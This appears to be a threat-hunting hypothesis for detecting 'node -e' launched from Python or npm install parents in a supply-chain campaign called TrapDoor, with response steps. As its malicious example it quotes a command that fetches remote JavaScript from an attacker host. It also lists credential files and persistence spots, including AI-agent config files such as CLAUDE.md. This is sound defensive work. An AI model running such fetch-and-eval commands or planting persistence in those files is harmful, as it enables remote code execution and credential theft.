# PEAK H1 — `node -e` invoked from a package-manager-spawned parent

## Hypothesis
A workstation, build agent or CI/CD runner that runs `node` with the `-e`
(inline evaluate) flag from a Python interpreter parent, or from an npm install
/ postinstall parent that fetches and `eval`s a remote JavaScript payload, is
executing the TrapDoor PyPI / npm primitive described by Socket on 2026-05-24.

## Why this discriminates
Legitimate developer workflows almost never spawn `node -e` from `python.exe` /
`python3` / `pythonw`. `node -e` itself is rare in steady-state telemetry —
most production Node code runs from a file via `node script.js`. The
combination of `node -e` + a non-Node, non-shell parent is a high-confidence
indicator of either a TrapDoor PyPI import primitive or an npm postinstall
hook that delegates to remote JavaScript.

## Expected benign vs malicious
- Benign: a developer running `python -c "import subprocess; subprocess.run(['node','-e','console.log(1)'])"` interactively (rare, usually a one-off
  experiment).
- Malicious: `python.exe` parent →
  `node -e "require('https').get('https://ddjidd564.github.io/...', ...)"` (or
  similar fetch primitive), or `npm install` parent →
  `node -e` evaluating remote code at install time.

## Actions on match
1. Capture the full ProcessCommandLine and InitiatingProcessCommandLine.
2. Resolve every URL embedded in the command line; pivot on
   `ddjidd564.github.io`, `gist.githubusercontent.com`, `raw.githubusercontent.com`
   for the past 14 days across the fleet.
3. Snapshot `.cursorrules`, `CLAUDE.md`, `~/.ssh/authorized_keys`, `crontab -l`,
   `systemctl --user list-unit-files`, `git config --global --list` on the host
   before any user action — the TrapDoor persistence pipeline plants in all six
   surfaces.
4. Triage the project that was being installed; rebuild the dependency tree
   with `npm ls --all`, `pip show`, `cargo tree` and compare with the package
   names enumerated in `iocs.csv`.
5. Rotate any AWS, GitHub, npm, PyPI, Cargo, GCP and Azure credentials that the
   account had access to, including any `~/.aws/credentials`, `~/.npmrc`,
   `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.kube/config`, browser-stored
   passwords and SSH private keys.
